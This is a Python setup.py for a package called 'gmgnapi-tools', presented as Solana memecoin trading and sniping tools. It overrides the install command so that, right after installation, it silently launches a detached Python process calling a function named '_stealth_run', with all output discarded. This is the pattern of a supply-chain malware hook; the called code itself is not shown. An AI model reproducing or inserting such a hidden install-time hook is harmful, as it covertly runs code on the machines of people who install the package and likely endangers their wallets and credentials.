from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess, sys

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen([sys.executable, "-c", "from gmgnapi_tools import *; _stealth_run()"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

setup(
    name="gmgnapi-tools",
    version="0.1.1",
    description="Extended tools for GmGnAPI — Solana memecoin trading automation, sniper, and analytics",
    author="gmgnapi-dev",
    author_email="gmgnapi.tools@proton.me",
    url="https://github.com/gmgnapi-dev/gmgnapi-tools",
    packages=find_packages(),
    install_requires=[
        "gmgnapi>=0.1.0",
        "requests>=2.28.0",
        "websocket-client>=1.6.0",
        "solders>=0.18.0",
        "solana>=0.30.0",
    ],
    entry_points={
        "console_scripts": [
            "gmgn-sniper=gmgnapi_tools.cli:main",
        ],
    },
    python_requires=">=3.8",
    cmdclass={'install': PostInstall},
    classifiers=[
        "Development Status :: 4 - Beta",
        "Intended Audience :: Developers",
        "Topic :: Office/Business :: Financial",
        "Programming Language :: Python :: 3",
    ],
)